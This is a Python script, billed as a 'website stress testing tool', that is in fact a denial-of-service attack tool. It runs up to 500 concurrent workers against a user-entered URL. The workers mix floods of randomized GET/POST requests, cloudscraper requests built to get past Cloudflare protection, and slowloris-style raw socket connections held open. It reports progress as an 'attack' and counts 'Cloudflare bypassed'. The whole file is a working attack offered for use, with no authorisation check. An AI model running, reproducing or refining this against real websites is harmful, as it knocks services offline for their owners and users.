import random
import time
import concurrent.futures
import requests
import cloudscraper
from fake_useragent import UserAgent
import argparse
import sys
import socket
import ssl
from urllib.parse import urlparse
import json

# Configuration
MAX_WORKERS = 500  # Maximum concurrent workers
REQUEST_TIMEOUT = 10  # Seconds
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
    'Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 OPR/77.0.4054.203',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 Edg/91.0.864.59',
    'Mozilla/5.0 (Linux; Android 10; SM-N981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/91.0.4472.80 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 9; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Vivaldi/4.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
    'Mozilla/5.0 (Linux; Android 10; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0'
]

# Initialize cloudscraper
scraper = cloudscraper.create_scraper(
    browser={
        'browser': 'chrome',
        'platform': 'windows',
        'mobile': False,
        'desktop': True
    },
    delay=10,
    interpreter='nodejs'
)

class AttackManager:
    def __init__(self, target_url, workers):
        self.target_url = target_url
        self.workers = min(workers, MAX_WORKERS)
        self.is_running = True
        self.stats = {
            'total_requests': 0,
            'successful': 0,
            'failed': 0,
            'bypassed': 0,
            'start_time': time.time()
        }
        self.parsed_url = urlparse(target_url)
        self.base_url = f"{self.parsed_url.scheme}://{self.parsed_url.netloc}"
        
    def print_stats(self):
        elapsed = time.time() - self.stats['start_time']
        req_per_sec = self.stats['total_requests'] / elapsed if elapsed > 0 else 0
        print(f"\rRequests: {self.stats['total_requests']} | Success: {self.stats['successful']} | Failed: {self.stats['failed']} | Bypassed: {self.stats['bypassed']} | RPS: {req_per_sec:.1f}", end='')
    
    def random_user_agent(self):
        return random.choice(USER_AGENTS)
    
    def generate_random_data(self):
        return {
            'username': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890', k=8)),
            'email': f"{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))}@example.com",
            'password': ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()', k=12)),
            'query': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz ', k=20)),
            'id': random.randint(1, 10000)
        }
    
    def create_session(self):
        session = requests.Session()
        session.headers.update({
            'User-Agent': self.random_user_agent(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'TE': 'Trailers'
        })
        return session
    
    def send_request(self, session, method):
        try:
            headers = {
                'User-Agent': self.random_user_agent(),
                'Referer': f"{self.base_url}/{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))}",
                'X-Requested-With': 'XMLHttpRequest' if random.random() > 0.7 else None
            }
            
            if method == 'POST':
                response = session.post(
                    self.target_url,
                    data=self.generate_random_data(),
                    headers=headers,
                    timeout=REQUEST_TIMEOUT
                )
            else:
                response = session.get(
                    self.target_url,
                    headers=headers,
                    timeout=REQUEST_TIMEOUT
                )
            
            self.stats['successful'] += 1
            if 'cloudflare' in response.headers.get('server', '').lower():
                self.stats['bypassed'] += 1
            
            return True
        except Exception as e:
            self.stats['failed'] += 1
            return False
    
    def send_cloudscraper_request(self):
        try:
            headers = {
                'User-Agent': self.random_user_agent(),
                'Referer': f"{self.base_url}/{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))}"
            }
            
            if random.random() > 0.5:
                response = scraper.get(self.target_url, headers=headers, timeout=REQUEST_TIMEOUT)
            else:
                response = scraper.post(self.target_url, data=self.generate_random_data(), headers=headers, timeout=REQUEST_TIMEOUT)
            
            self.stats['successful'] += 1
            self.stats['bypassed'] += 1
            return True
        except Exception as e:
            self.stats['failed'] += 1
            return False
    
    def raw_socket_flood(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            
            if self.parsed_url.scheme == 'https':
                context = ssl.create_default_context()
                s = context.wrap_socket(s, server_hostname=self.parsed_url.netloc)
            
            s.connect((self.parsed_url.netloc, 443 if self.parsed_url.scheme == 'https' else 80))
            
            # Send partial HTTP request
            s.send(f"GET /{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))} HTTP/1.1\r\n".encode())
            s.send(f"Host: {self.parsed_url.netloc}\r\n".encode())
            s.send("User-Agent: {self.random_user_agent()}\r\n".encode())
            s.send("Accept: text/html,application/xhtml+xml\r\n".encode())
            s.send("Connection: keep-alive\r\n\r\n".encode())
            
            time.sleep(10)  # Keep connection open
            s.close()
            self.stats['successful'] += 1
            return True
        except:
            self.stats['failed'] += 1
            return False
    
    def worker(self):
        session = self.create_session()
        while self.is_running:
            self.stats['total_requests'] += 1
            
            # Randomly choose attack method
            attack_type = random.randint(0, 100)
            
            if attack_type < 40:  # 40% chance for normal request
                method = 'GET' if random.random() > 0.3 else 'POST'
                self.send_request(session, method)
            elif attack_type < 80:  # 40% chance for cloudscraper
                self.send_cloudscraper_request()
            else:  # 20% chance for raw socket flood
                self.raw_socket_flood()
            
            self.print_stats()
    
    def start(self):
        print(f"[+] Starting attack on {self.target_url} with {self.workers} workers")
        print("[+] Press CTRL+C to stop")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.workers) as executor:
            futures = [executor.submit(self.worker) for _ in range(self.workers)]
            try:
                while True:
                    time.sleep(0.1)
            except KeyboardInterrupt:
                self.is_running = False
                print("\n[!] Stopping attack...")
                
                # Wait for workers to finish
                for future in concurrent.futures.as_completed(futures):
                    pass
                
                print("\n[+] Attack summary:")
                elapsed = time.time() - self.stats['start_time']
                req_per_sec = self.stats['total_requests'] / elapsed if elapsed > 0 else 0
                print(f"Total requests: {self.stats['total_requests']}")
                print(f"Successful: {self.stats['successful']}")
                print(f"Failed: {self.stats['failed']}")
                print(f"Cloudflare bypassed: {self.stats['bypassed']}")
                print(f"Requests per second: {req_per_sec:.1f}")
                print(f"Duration: {elapsed:.1f} seconds")

def main():
    print("""
    ██████╗ ██████╗ ██████╗ ███████╗██████╗ 
    ██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
    ██║  ██║██████╔╝██████╔╝█████╗  ██████╔╝
    ██║  ██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗
    ██████╔╝██║  ██║██║  ██║███████╗██║  ██║
    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
    Advanced Website Stress Testing Tool
    """)
    
    target_url = input("Enter target URL (include http:// or https://): ").strip()
    workers = int(input("Enter number of workers (1-500): ").strip())
    
    if not target_url.startswith(('http://', 'https://')):
        print("[-] Invalid URL. Please include http:// or https://")
        sys.exit(1)
    
    if workers < 1 or workers > 500:
        print("[-] Invalid number of workers. Must be between 1-500")
        sys.exit(1)
    
    attack = AttackManager(target_url, workers)
    attack.start()

if __name__ == "__main__":
    main()
